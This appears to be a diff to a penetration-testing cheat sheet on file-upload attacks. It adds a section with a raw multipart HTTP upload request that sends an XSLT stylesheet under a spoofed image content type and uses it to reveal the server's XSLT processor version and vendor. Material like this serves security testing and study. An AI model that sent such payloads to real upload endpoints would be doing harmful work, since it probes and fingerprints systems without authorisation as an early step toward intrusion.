@@ -193,6 +193,30 @@ Content-Type: text/html
 -----------------------------4829104394923874193918493216
 ```
 
+#### XSLT Extention Allowed
+Extensible Stylesheet Language Transformations (XSLT) is an XML-based language usually used when transforming XML documents into HTML, another XML document, or PDF. 
+```
+POST /upload HTTP/1.1
+Host: website.com
+Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216
+
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="file" filename="xss.xslt"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:output method="html"/>
+<xsl:template match="/">
+    <h2>XSLT identification</h2>
+    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
+    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
+    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
+</xsl:template>
+</xsl:stylesheet>
+-----------------------------4829104394923874193918493216
+```
+
 # Bypasses
 
 #### Keeping The Image Header 
